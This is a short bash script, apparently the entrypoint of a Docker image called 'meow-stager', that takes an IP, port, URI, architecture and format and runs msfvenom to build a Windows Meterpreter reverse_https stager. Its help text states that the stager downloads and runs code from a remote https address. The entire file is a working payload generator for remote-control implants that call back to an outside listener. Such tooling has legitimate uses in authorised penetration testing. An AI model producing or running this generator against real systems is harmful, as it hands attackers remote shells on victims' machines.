#!/bin/bash

arch=""
ip=""
port=""
uri=""
f=""

while getopts ":a:i:p:u:f:h" opt; do
  case $opt in
    a)
      arch="$OPTARG"
      ;;
    i)
      ip="$OPTARG"
      ;;
    p)
      port="$OPTARG"
      ;;
    u)
      uri="$OPTARG"
      ;;
    f)
      f="$OPTARG"
      ;;
    h)
      echo "Usage:  -a <arch> -i <ip> -p <port> -u <uri> -f <format>"
      echo "e.g. sudo docker run -it --rm meow-stager -a x86 -i 192.168.87.87 -p 4444 -u meow -f ps1"
      echo "Will create a stager and download & run from https://192.168.87.87:4444/meow"
      exit 0
      ;;
    \?)
      echo "Invalid option: -$OPTARG" >&2
      exit 1
      ;;
    :)
      echo "Option -$OPTARG requires an argument." >&2
      exit 1
      ;;
  esac
done

if [ -z "$arch" ] || [ -z "$ip" ] || [ -z "$port" ] || [ -z "$uri" ] || [ -z "$f" ]; then
  echo "Missing required arguments. Use -h for help."
  exit 1
fi

if [ "$arch" == "x64" ]; then
    payload="windows/x64/meterpreter/reverse_https"
else
    payload="windows/meterpreter/reverse_https"
fi

/usr/src/metasploit-framework/msfvenom -p "$payload" LHOST="$ip" LPORT="$port" LURI="$uri" EXITFUNC=thread -f "$f"

